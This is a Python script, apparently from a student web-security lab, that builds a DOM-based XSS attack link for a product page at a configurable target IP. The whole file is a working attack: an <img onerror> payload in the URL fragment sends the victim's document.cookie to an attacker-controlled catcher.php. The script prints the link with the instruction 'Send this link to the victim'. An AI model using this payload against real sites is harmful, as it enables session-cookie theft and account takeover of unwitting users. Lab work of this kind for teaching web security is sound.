# DOM-based XSS Attack Link Builder
#
# The target page reads `location.hash` and writes it into `innerHTML`,
# so the payload travels in the URL fragment (#...). Browsers NEVER send
# the fragment to the server, so the target web server logs only see a
# clean request - the malicious portion lives entirely in the victim's
# browser. That is what makes this DOM XSS and not Reflected XSS.

# Default to localhost so the lab works on a single XAMPP machine.
# For a real demo across two computers, change TARGET_IP to the IP of
# the vulnerable site and ATTACKER_IP to the IP running the catcher
# (AttackerServer/catcher.php).
TARGET_IP = "localhost"

# product_view.php?id=1 is the "Bamba" snack (category: snacks_dry),
# which is one of the pages that renders the vulnerable tab strip.
TARGET_URL = f"http://{TARGET_IP}/CyberProject/product_view.php?id=1"

# Attacker's address (where the stolen cookie will be sent)
ATTACKER_IP = "localhost"

# The payload: an <img> with a broken src so its onerror handler fires.
# The handler navigates to the catcher with the victim's cookie base64-
# encoded in the `data` query parameter.
payload = (
    f"<img src=x onerror=\"document.location="
    f"'http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data='"
    f"+btoa(document.cookie)\">"
)

# Important: we do NOT URL-encode the fragment. Browsers leave HTML
# special characters in the fragment alone, and the page's JavaScript
# reads `location.hash` verbatim - so the payload only needs to be valid
# HTML, not valid URL-encoded text. Encoding it would just turn the
# payload into a harmless literal string.
malicious_link = f"{TARGET_URL}#{payload}"

print("=" * 60)
print(f"[!] DOM XSS Payload Generated (Target: {TARGET_IP})")
print("=" * 60)
print(f"\nSend this link to the victim:\n\n{malicious_link}")
print("\nNote: the server's access log will only see")
print(f"  GET /CyberProject/product_view.php?id=1")
print("- the fragment never reaches the server.")
